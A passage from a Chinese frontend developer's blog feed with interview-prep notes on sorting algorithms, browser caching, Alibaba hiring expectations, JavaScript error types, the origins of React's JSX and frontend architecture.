inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const arr = <span class="comment">[234,5,6,7,23,34,5432,6,76,23,432,342,6,234,234]</span></span><br><span class="line"></span><br><span class="line">for (let j=0;j&lt;arr.length-1;j++) &#123;</span><br><span class="line">  for (let i=0;i&lt;arr.length-1;i++) &#123;</span><br><span class="line">    if (arr<span class="comment">[i]</span> &gt; arr<span class="comment">[i+1]</span>) &#123;</span><br><span class="line">      <span class="comment">[arr<span class="comment">[i]</span>, arr<span class="comment">[i+1]</span>]</span> = <span class="comment">[arr<span class="comment">[i+1]</span>, arr<span class="comment">[i]</span>]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(arr)</span><br></pre></td></tr></table></figure><blockquote><p>遍历 <code>arr.length - 1</code> 轮即可完成排序，<strong>但是</strong>每次遍历以后都能确定一个最大值，所以每轮底下的比较长度需要剪短，即：<code>i &lt; arr.length - 1 - j</code></p></blockquote><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const arr = <span class="comment">[234,5,6,7,23,34,5432,6,76,23,432,342,6,234,234]</span></span><br><span class="line"></span><br><span class="line">for (let j=0;j&lt;arr.length-1;j++) &#123;</span><br><span class="line">  for (let i=0;i&lt;arr.length-1- j;i++) &#123;</span><br><span class="line">    if (arr<span class="comment">[i]</span> &gt; arr<span class="comment">[i+1]</span>) &#123;</span><br><span class="line">      <span class="comment">[arr<span class="comment">[i]</span>, arr<span class="comment">[i+1]</span>]</span> = <span class="comment">[arr<span class="comment">[i+1]</span>, arr<span class="comment">[i]</span>]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(arr)</span><br></pre></td></tr></table></figure><h1 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h1><blockquote><p>快，但费内存</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const arr = [<span class="number">234</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">34</span>,<span class="number">5432</span>,<span class="number">6</span>,<span class="number">76</span>,<span class="number">23</span>,<span class="number">432</span>,<span class="number">342</span>,<span class="number">6</span>,<span class="number">234</span>,<span class="number">234</span>]</span><br><span class="line">const inputArr = [] <span class="comment">// 输入</span></span><br><span class="line">arr.<span class="built_in">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> inputArr[v] ? (inputArr[v] += <span class="number">1</span>) : (inputArr[v] = <span class="number">1</span>))</span><br><span class="line">const output = [] <span class="comment">// 输出</span></span><br><span class="line">inputArr.<span class="built_in">map</span>(<span class="function">(<span class="params">v,i</span>) =&gt;</span> [...<span class="built_in">Array</span>(v)].<span class="built_in">map</span>(<span class="function"><span class="params">()</span> =&gt;</span> output.<span class="built_in">push</span>(i)))</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(output)</span><br></pre></td></tr></table></figure><h1 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h1><blockquote><p>相比计数排序，一个桶放更多数字</p></blockquote><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arr = [12,21,6,6,33,34,2,0,2]</span></span><br><span class="line"><span class="attribute">计数</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="attribute">0</span><span class="punctuation">:</span> <span class="string">1,</span></span><br><span class="line">  <span class="attribute">2</span><span class="punctuation">:</span> <span class="string">2,</span></span><br><span class="line">  <span class="attribute">6</span><span class="punctuation">:</span> <span class="string">2,</span></span><br><span class="line">  <span class="attribute">12</span><span class="punctuation">:</span> <span class="string">1,</span></span><br><span class="line">  <span class="attribute">21</span><span class="punctuation">:</span> <span class="string">1,</span></span><br><span class="line">  <span class="attribute">33</span><span class="punctuation">:</span> <span class="string">1,</span></span><br><span class="line">  <span class="attribute">34</span><span class="punctuation">:</span> <span class="string">1</span></span><br><span class="line"><span class="attribute">&#125;</span></span><br><span class="line"><span class="attribute">桶</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="attribute">1</span><span class="punctuation">:</span> <span class="string">[6,6,2,0,2], // 小于10的一个桶</span></span><br><span class="line">  <span class="attribute">2</span><span class="punctuation">:</span> <span class="string">[12],</span></span><br><span class="line">  <span class="attribute">3</span><span class="punctuation">:</span> <span class="string">[21],</span></span><br><span class="line">  <span class="attribute">4</span><span class="punctuation">:</span> <span class="string">[33, 34]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>占用内存更少了，第一个桶里虽然数字多了、还需二次排序，但是可以运用快排的思路（快排为什么快，因为每次比较不用跟所有数字比较，只需要跟部分比较就行）。</p></blockquote><h1 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h1><blockquote><p>可以排更大的数字，需要更少的桶<br>如图，以十进制数字为例：先以数字的个位进行入桶操作，然后出桶，再以数字的十位入桶，出桶，重复操作，最后即可完成排序。<br><img src="/Blog/2019/03/07/interview/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/index/img.webp"></p></blockquote><h1 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h1><blockquote><p>先按数组顺序生成二叉树，从右往左（因为只有完全二叉树才能用数组表示）最小的二叉树比较，逐渐生成最大堆。</p></blockquote><p><img src="/Blog/2019/03/07/interview/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/index/img_1.webp"><br><a href="https://www.cnblogs.com/onepixel/p/7674659.html">图片参考</a></p><h1 id="排序算法的时间复杂度和空间复杂度"><a href="#排序算法的时间复杂度和空间复杂度" class="headerlink" title="排序算法的时间复杂度和空间复杂度"></a>排序算法的时间复杂度和空间复杂度</h1><p><img src="/Blog/2019/03/07/interview/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/index/img.png"></p><p>注：</p><p>1 归并排序可以通过手摇算法将空间复杂度降到O(1)，但是时间复杂度会提高。</p><p>2 基数排序时间复杂度为O(N*M)，其中N为数据个数，M为数据位数。</p><p>辅助记忆</p><p>时间复杂度记忆-<br>冒泡、选择、直接 排序需要两个for循环，每次只关注一个元素，平均时间复杂度为O(n²)）（一遍找元素O(n)，一遍找位置O(n)）<br>快速、归并、希尔、堆基于二分思想，log以2为底，平均时间复杂度为O(nlogn)（一遍找元素O(n)，一遍找位置O(logn)）<br>稳定性记忆-“快希选堆”（快牺牲稳定性）<br>排序算法的稳定性：排序前后相同元素的相对位置不变，则称排序算法是稳定的；否则排序算法是不稳定的。</p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进阿里的要求</title>
      <link href="/Blog/2019/03/07/interview/%E8%BF%9B%E9%98%BF%E9%87%8C%E7%9A%84%E8%A6%81%E6%B1%82/index/"/>
      <url>/Blog/2019/03/07/interview/%E8%BF%9B%E9%98%BF%E9%87%8C%E7%9A%84%E8%A6%81%E6%B1%82/index/</url>
      
        <content type="html"><![CDATA[<h1 id="1、思维模式"><a href="#1、思维模式" class="headerlink" title="1、思维模式"></a>1、思维模式</h1><h4 id="DO-WHAT-HOW-WHY"><a href="#DO-WHAT-HOW-WHY" class="headerlink" title="DO-WHAT-HOW-WHY"></a>DO-WHAT-HOW-WHY</h4><p>do：会做一件事情，<br>what：知道为什么做这件事（分配一个任务，知道是什么任务，也知道为什么会有这个需求，那就做了）<br>how：虽然会做也知道为什么做，但是光只会做，并没有思考最优解。比如你有个锤子，看什么都像钉子，有时候不需要很复杂，一个电话就解决了。<br>why：最高级，公司为什么要做这件事情，不这样做换种方式能否达到效果，基本就是站在老板的角度思考，站在产品最高点思考这个问题。</p><h1 id="2、潜力"><a href="#2、潜力" class="headerlink" title="2、潜力"></a>2、潜力</h1><h4 id="怎么证明自己有潜力"><a href="#怎么证明自己有潜力" class="headerlink" title="怎么证明自己有潜力"></a>怎么证明自己有潜力</h4><p>首先问你一个问题，然后问你的回答有什么问题，回答出来以后继续问你的回答还有什么问题。<br>解决方法，就先不要把自己的答案全部透露出去，主要还是看平时的积累</p><p>同事面<br>leader面<br>交叉面<br>hr面</p><p>p6硬性工作条件：<br>工作时间：2年经验<br>简历：拿到你的简历以后，可以看到你的投递记录，面试记录。最好的投递方式，先在百度，腾讯互相投，最后投阿里，成功几率会大大增加。<br>学校：本科及以上<br>项目：质量非常高，比如说：项目是否足够灵动（设计感强，特效之类的），性能（高并发）<br>电话面试：24小时开机，刷全网的面试经历很可能刷到，30-60分钟。</p><h4 id="开放性问题："><a href="#开放性问题：" class="headerlink" title="开放性问题："></a>开放性问题：</h4><p>比如说在周末的时候，领导跟你说了一个项目上的bug</p><p>首先先去看bug的原因和解决方法，如果很快就能解决那就当场解决，同时也要通知自己的朋友（等我一会或者改天再约）如果不能就需要考虑回滚版本，<br>如果bug很严重，比如说是影响用户下单的bug，要拼死解决，<br>最后，在解决bug以后，我会思考为什么这次修复会出现这个bug，上班的时候怎么就没发现呢？<br>如果不是代码的问题，那是不是就是流程问题呢，我们的代码发布流程没有review机制，没有单元测试，没有和测试人员沟通好呢？</p><h4 id="破局方法"><a href="#破局方法" class="headerlink" title="破局方法"></a>破局方法</h4><p>代码（硬技能）：基础：比如写博客，学会总结、归纳。流行：对新事物的热情，多看github或者知乎掘金活跃的人。</p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>聊聊浏览器缓存机制把</title>
      <link href="/Blog/2019/03/07/interview/%E8%81%8A%E8%81%8A%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E6%8A%8A/index/"/>
      <url>/Blog/2019/03/07/interview/%E8%81%8A%E8%81%8A%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E6%8A%8A/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>缓存可以说是性能优化中简单高效的一种优化方式了，它可以显著减少网络传输所带来的损耗。</p></blockquote><p>对于一个数据请求来说，可以分为发起网络请求、后端处理、浏览器响应三个步骤。浏览器缓存可以帮助我们在第一和第三步骤中优化性能。比如说直接使用缓存而不发起请求，或者发起了请求但后端存储的数据和前端一致，那么就没有必要再将数据回传回来，这样就减少了响应数据。</p><p>接下来的内容中我们将通过以下几个部分来探讨浏览器缓存机制：</p><ul><li>缓存位置</li><li>缓存策略</li><li>实际场景应用缓存策略</li></ul><h3 id="缓存位置"><a href="#缓存位置" class="headerlink" title="缓存位置"></a>缓存位置</h3><p>从缓存位置上来说分为四种，并且各自有<strong>优先级</strong>，当依次查找缓存且都没有命中的时候，才会去请求网络</p><ul><li>Service Worker</li><li>Memory Cache</li><li>Disk Cache</li><li>Push Cache</li><li>网络请求</li></ul><h3 id="缓存策略"><a href="#缓存策略" class="headerlink" title="缓存策略"></a>缓存策略</h3><p>通常浏览器缓存策略分为两种：<strong>强缓存</strong>和<strong>协商缓存</strong>，并且缓存策略都是通过设置 <code>HTTP Header</code> 来实现的。</p><h5 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h5><p>强缓存可以通过设置两种 <code>HTTP Header</code> 实现：<code>Expires</code> 和 <code>Cache-Control</code> 。强缓存表示在缓存期间不需要请求，<code>state code</code> 为 <code>200</code>。</p><p>这两<strong>区别</strong>就是 <code>Expires</code> 是 <code>HTTP/1</code> 的产物，设置具体的过期时间，到了指定时间需要再次请求。并且 <code>Expires</code> 受限于本地时间，如果修改了本地时间，可能会造成缓存失效。<br>而 <code>Cache-Control</code> 出现于 <code>HTTP/1.1</code>，优先级高于 <code>Expires</code> 。该属性值表示资源会在多少秒后过期，需要再次请求。</p><h5 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h5><p>如果缓存过期了，就需要发起请求验证资源是否有更新。协商缓存可以通过设置两种 <code>HTTP Header</code> 实现：<code>Last-Modified</code> 和 <code>ETag</code> 。并且 <code>ETag</code> 优先级比 <code>Last-Modified</code> 高。</p><p>当浏览器发起请求验证资源时，如果资源没有做改变，那么服务端就会返回 304 状态码，并且更新浏览器缓存有效期。</p><p><strong>但是 <code>Last-Modified</code> 存在一些弊端</strong>：</p><p>如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 <code>Last-Modified</code> 被修改，服务端不能命中缓存导致发送相同的资源</p><p>因为 <code>Last-Modified</code> 只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源<br>因为以上这些弊端，所以在 <code>HTTP / 1.1</code> 出现了 <code>ETag</code> 。</p><p>以上就是缓存策略的所有内容了，看到这里，不知道你是否存在这样一个疑问。<strong>如果什么缓存策略都没设置，那么浏览器会怎么处理？</strong></p><p>对于这种情况，浏览器会采用一个启发式的算法，通常会取响应头中的 Date 减去 Last-Modified 值的 10% 作为缓存时间。</p><p><img src="/Blog/2019/03/07/interview/%E8%81%8A%E8%81%8A%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E6%8A%8A/index/img.png" alt="多种指令配合流程图"></p><p><img src="/Blog/2019/03/07/interview/%E8%81%8A%E8%81%8A%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E6%8A%8A/index/img_1.png" alt="常见指令作用"></p><h3 id="实际场景应用缓存策略"><a href="#实际场景应用缓存策略" class="headerlink" title="实际场景应用缓存策略"></a>实际场景应用缓存策略</h3><h5 id="频繁变动的资源"><a href="#频繁变动的资源" class="headerlink" title="频繁变动的资源"></a>频繁变动的资源</h5><p>对于频繁变动的资源，首先需要使用 <code>Cache-Control: no-cache</code> 使浏览器每次都请求服务器，然后配合 <code>ETag</code> 或者 <code>Last-Modified</code> 来验证资源是否有效。这样的做法虽然不能节省请求数量，但是能显著减少响应数据大小。</p><h5 id="代码文件"><a href="#代码文件" class="headerlink" title="代码文件"></a>代码文件</h5><p>这里特指除了 HTML 外的代码文件，因为 HTML 文件一般不缓存或者缓存时间很短。</p><p>一般来说，现在都会使用工具来打包代码，那么我们就可以对文件名进行哈希处理，只有当代码修改后才会生成新的文件名。基于此，我们就可以给代码文件设置缓存有效期一年 <code>Cache-Control: max-age=31536000</code>，这样只有当 HTML 文件中引入的文件名发生了改变才会去下载最新的代码文件，否则就一直使用缓存。</p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试遇到这些问题怎么回答</title>
      <link href="/Blog/2019/03/07/interview/%E9%9D%A2%E8%AF%95%E9%81%87%E5%88%B0%E8%BF%99%E4%BA%9B%E9%97%AE%E9%A2%98%E6%80%8E%E4%B9%88%E5%9B%9E%E7%AD%94/index/"/>
      <url>/Blog/2019/03/07/interview/%E9%9D%A2%E8%AF%95%E9%81%87%E5%88%B0%E8%BF%99%E4%BA%9B%E9%97%AE%E9%A2%98%E6%80%8E%E4%B9%88%E5%9B%9E%E7%AD%94/index/</url>
      
        <content type="html"><![CDATA[<p>1.你遇到最难的技术问题是什么？<br>举个最近的例子把，对react的，我之前是写vue的，最开始我再写react的时候，他能在return中直接写html标签非常不理解，然后在我实际写demo中会出现很多错误，所以我会采用github上看别人reactUI的源码，因此我还专门写了一篇博客，模仿他们的代码，向他们学习，因为身边也没人用react，我是自学的所以我还会上StackOverflow上多提问题。<br>用vue的时候，数据比较复杂，组件间的交互比较多，所以只能上vuex，上github对代码结构优化，还有异步的问题，最后对代码的模块化。<br>克服困难，不能停止。</p><p>2.你平时逛哪些网站？<br>比如说我要做一个弹窗，我想更精致更漂亮，我会上github上看代码，去模仿他们，遇到问题的时候会上StackOverflow，和google，mdn当成网上字典，css的兼容性会上caniuse<br>文章：张鑫旭，大漠，阮一峰<br>社区：知乎，v2ex，掘金</p><p>3.你最近看了那些书？<br>js高程，css权威指南，我个人对vue用的多，但是不建议买书，基本都是官网抄袭，我个人先看的阮一峰的js，由于高程很厚，所以我会挑一些知识点来看，书很厚，当成字典来用</p><p>4.职业规划是怎么样的？<br>一周到两周内快速熟悉项目，一年后独当一面，能够在新项目上产品交流，和后端沟通。两到三年，成为leader带人。</p><p>5.对前端工程师的理解。<br>我觉得优秀的前端能把页面写的很漂亮，写出最好的代码去还原设计师的图，能够独当一面，</p><p>6.空白期<br>没有空白期，中国人怎么会有空白期，在准备考试公务员、研究生</p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javascript 调试常见报错</title>
      <link href="/Blog/2019/02/26/day_thinking/Javascript%E8%B0%83%E8%AF%95%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/index/"/>
      <url>/Blog/2019/02/26/day_thinking/Javascript%E8%B0%83%E8%AF%95%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/index/</url>
      
        <content type="html"><![CDATA[<p>ECMA-262 定义了下列 7 种错误类型：</p><ol><li><p>Error 错误</p></li><li><p>EvalError 全局错误</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ReferenceError">ReferenceError</a>（引用错误） <strong>对象表明一个不存在的变量被引用。</strong></p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RangeError">RangeError</a> <strong>对象标明一个错误，当一个值不在其所允许的范围或者集合中。</strong></p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/SyntaxError">SyntaxError</a>（语法错误）<strong>对象代表尝试解析语法上不合法的代码的错误。</strong></p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError">typeError</a>（类型错误）<strong>对象用来表示值的类型非预期类型时发生的错误</strong></p></li><li><p>URIError  编码错误</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>趣谈 React 的由来</title>
      <link href="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/"/>
      <url>/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/</url>
      
        <content type="html"><![CDATA[<p>近期开始的了新的学习(react)，<br>本人学习有个习惯，<br>喜欢去探索由来和历史，<br>俗称吃瓜(手动滑稽)</p><blockquote><p>一般网上的视频教程只会教你怎么用 <code>react</code> 但是并不会告诉你 <code>react</code> 是当初是怎么来的，为了解决哪些痛点。</p></blockquote><p>首先我们先来看一段 <code>js</code> <a href="https://jsbin.com/tiyowiy/3/edit?html,js,output">原生代码</a>。</p><p><img src="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/img.png"></p><p>这是一段很简单的代码，用于操作 <code>result</code> 的增减，<br>现在，<br>让我们来抽象的看待这个问题，<br>画个图来表示：</p><p><img src="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/img_1.png"></p><ul><li>不管你使用原生 <code>js</code> 还是 <code>jq</code> 都要通过dom提供的 <code>API</code>，经历先从页面取到内容，然后经过 <code>js</code> 操作以后再填回去。</li><li><code>react</code> 同学认为这太智障了，虽然简单，但是能不能砍掉上面的步骤(从dom取内容)或下面的步骤(填回内容)呢，从而更简便呢？</li><li>于是 <code>react</code> 同学砍掉了上面的步骤(砍掉下面的步骤不现实，因为js将无法通知页面)，直接在 <code>js</code> 中生成 <code>HTML</code> 然后自动页面中同步(用虚线表示)，然后当数据更新时，<code>react</code> 将重新生成一个对象，再自动的去更新原来页面的元素，从而使得页面中的数据也是最新值。</li><li>这样一来事情就变得简单了，代码量减少一半， <code>js</code> 再也不用去页面中取元素，只需再 <code>js</code> 中生成填回页面中即可。从来不去取页面中的元素，只去填东西。<code>react</code> 就是在这种理念下诞生了。</li></ul><p><strong>接下里我们用这种理念重写一次上面的代码。</strong></p><p>根据上图的操作在页面中加入一个 <code>span</code></p><p><img src="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/img_2.png"></p><p>然后为了加个按钮（为了简化先在页面中手动增加）</p><p><img src="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/img_3.png"></p><p>目前代码有点粗糙，但是为了简单明了演示上图的理念。</p><ol><li>在 <code>js</code> 中生成对象插入到页面中</li><li>更新数据时，重新在 <code>js</code> 中生成对象同步更新原来的页面元素</li></ol><p>接着我们开始优化一下<a href="https://jsbin.com/meticaf/1/edit?html,js,output">上图代码</a>，并把按钮也放入 <code>js</code> 代码中：</p><p><img src="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/img_4.png"></p><p>但是炸一看<a href="https://jsbin.com/vevavur/1/edit?html,js,output">这代码</a>还是很傻<code>*</code>，于是我们继续来 <strong>分三步</strong> 更层次优化代码</p><ol><li>这个 <code>React.creatElement</code> 方法名字太长了，抽出</li><li>这些个变量只用过一次，那我们就可以跳过声明变量，直接使用</li></ol><p>于是代码就变成了这个样子：</p><p><img src="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/img_5.png"></p><p>具有一双慧眼的你，应该也看的出来这样的代码很像一种东西把…</p><p>这也就是 <code>react</code> 最聪明的一点优化，</p><p><img src="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/img_6.png" alt="请先忽略变量的转换"></p><p>我们惊讶的发现，这样的 <code>js</code> 代码和 <code>HTML</code> 标签上并没有什么区别，<br>于是聪明的 <code>react</code> 同学诞生了另一个想法(JSX)，我们能不能让用户写下面的代码，然后经过程序转换成上面的代码呢？<br>这样一来，最终的结果就是我们通过写下面的代码来替换（也就是等价于）上面的代码。<br>经过 <code>react</code> 同学一番折腾，<code>JSX</code> 语法上线了 （<strong>敲黑板，重点</strong>：我们并不是在写HTML代码，而是用HTML的形式来写JS代码）</p><p>Finally，代码变成了<a href="https://jsbin.com/vudezis/14/edit?html,js,output">这样子</a>（<code>react</code> 最终的样子）</p><p><img src="/Blog/2019/02/19/react/%E8%B6%A3%E8%B0%88React%E7%9A%84%E7%94%B1%E6%9D%A5/index/img_7.png"></p><p>本文完。</p><blockquote><p>PS<br>我们改变过后的类似 <code>HTML</code> 代码就是虚拟 <code>DOM</code></p><p>还有回答一些弱智问题<br>为什么我们在写 <code>JSX</code> 的时候，绑定事件的时候函数名后面不带括号？<br>因为在一开始的时候我们在 <code>js</code> 中写的是对象 <code>&#123;onClick: fn&#125;</code> ，这里需要的fn是整个函数，如果写成 <code>&#123;onClick: fn()&#125;</code>，赋值给 <code>onClick</code> 的就是函数的返回值。<br>插值？<br>jsx 中不需要 slot，都能用 props 代替，包括事件<br>props 继承和 vue 相比？<br>按照 js 的对象规则合并即可， {…props}<br>循环？<br>数组的操作方法<br>样式 class 早期不能使用？<br>class 是 js 的关键词，现在已经解决了这个问题</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>39丨综合：前端架构</title>
      <link href="/Blog/2019/01/30/relearn_FE/39%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/39%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/index/</url>
      
        <content type="html"><![CDATA[<p>在传统桌面软件开发中，架构师是一种通过设计架构保证团队能够良好分工和有序工作的岗位。</p><p>在工程领域，我们凡是要做点什么事儿，都会有明确的目的性，这个目的性，一定是为了完成生产服务业务的。</p><p>为什么桌面软件开发需要架构师和架构设计呢？因为桌面软件开发具有高度的复杂性，如果没有架构，就没法分解成互相耦合低的模块来分工。</p><p>所以一般来说，架构是为了分工而存在的。但是到了前端领域，这个问题是否还存在呢？答案是，不存在。</p><p>前端是个天然按照页面解耦的技术，在多页面架构中，页面的复杂度大约刚好适合一个人的工作量。（所以，我们的结论是，前端根本不需要架构设计。当然，我这句话是开玩笑的。）</p><p>前端不存在分工问题，但是在多人协同时，仍然要解决质量和效率的问题，这就需要组件化了。除此之外还有前端特有的兼容性问题，也是需要从架构的角度去解决的。</p><p>对于一些追求极致的团队来说，会挑战“单页面应用”，通过单页面应用来提升用户体验，单页面应用的升级版本是谷歌提出的 PWA，PWA 既是业务方案也是技术方案，在技术层面，它近乎苛刻地规定了网页的各方面的体验标准。</p><p>前端领域还有一个特有的生态：框架，第一代前端框架（如 jQuery, PrototypeJS）重点解决了兼容问题和 API 的易用性问题，在现代浏览器普及之后，这些问题逐渐变得不存在或者不重要，所以第二代前端框架（如 Vue，Angular，React）重点解决了组件化问题。选择合适的框架，可以节约架构的成本，还能够享受社区资源。</p><p>本节课，我会围绕前端架构的几个核心问题，为你介绍前端架构工作。</p><p>首先我们来讲讲组件化。</p><h2 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h2><p>组件化讲起来是个非常简单的概念，前端主要的开发工作是 UI 开发，而把 UI 上的各种元素分解成组件，规定组件的标准，实现组件运行的环境就是组件化了。</p><p>现行的组件化方案，目前有五种主流选择：</p><ul><li>Web Component；</li><li>Vue；</li><li>React；</li><li>Angular；</li><li>自研。</li></ul><p>Web Component 是 W3C 推行的规范，理论上是未来的选项；但是实际上这份标准的状态堪忧，Shadow DOM 的设计比较复杂，一般的前端掌握起来都比较困难。</p><p>此外，CSS 也比较难以应用，需要依靠 CSS Houdini。目前来说，我还没有看到那个前端团队实际在使用 Web Component 作为组件化方案。当然，它的优势也非常明显：不需要任何额外的运行时支持，就能在现代浏览器环境运行，也可以跟 HTML 无缝结合。</p><p>Vue 是目前最受欢迎的框架（从 github star 来看），由华人程序员尤小右开发和维护。它有两个主要特点，一个是比较符合原本的 JavaScript&#x2F;CSS&#x2F;HTML 书写习惯；另一个是它绑定了 MVVM 模式，直接确定了 UI 架构，通过 DSL 的支持，数据交互非常简洁。</p><p>React 是 Facebook 推行的新一代 Web 框架。它利用 JSX 模式，把 HTML、CSS 和 JavaScript 都放进了 js 文件中，对于不喜欢 CSS 和 HTML 的前端工程师来说，是很理想的。它还可以迁移到 React Native，直接编写简单的客户端应用。</p><p>Angular 是 Google 推出的 Web 框架，它是比较标准的 MVVM 模式。Angular 曾经因为大版本兼容性而饱受诟病，目前它的核心竞争力是与 TypeScript 结合得较好。</p><p>上面是我对几种方案的简单介绍。但是实际上，我们做技术选型时的主要依据是团队的现状，开发移动端还是桌面端、是否跟 Native 结合、团队成员的技能分布都是需要考虑的因素，这些框架本身的特点，目前我认为仅仅是一种偏好选项，而不是关键因素。</p><h2 id="兼容性和适配性"><a href="#兼容性和适配性" class="headerlink" title="兼容性和适配性"></a>兼容性和适配性</h2><p>前端开发的特有问题就是兼容性，到了移动时代，需要面对不同的机型，我们又需要解决适配性问题。</p><p>兼容性问题到 2011 年左右都是前端的主旋律，但是在之后，随着现代浏览器的逐渐普及，兼容性问题逐渐减小，所以我们这里就不多谈兼容性问题了。</p><p>适配问题主要适配的是屏幕的三个要素。</p><ul><li>单位英寸像素数（Pixel Per Inch，PPI）：现实世界的一英寸内像素数，决定了屏幕的显示质量。</li><li>设备像素比率（Device Pixel Ratio，DPR）：物理像素与逻辑像素（px）的对应关系。</li><li>分辨率（Resolution）：屏幕区域的宽高所占像素数。</li></ul><p>在当前环境下，分辨率适配可以使用 vw 单位解决，DPR 适配则需要用到 CSS 的 viewport 规则来控制缩放比例解决，而 PPI 主要影响的是文字，可以采用 media 规则来适配。</p><h2 id="单页应用"><a href="#单页应用" class="headerlink" title="单页应用"></a>单页应用</h2><p>前文已经讲过，前端架构的解耦问题不大，因为页面是天然解耦的，但是，大家都知道，浏览器加载 HTML 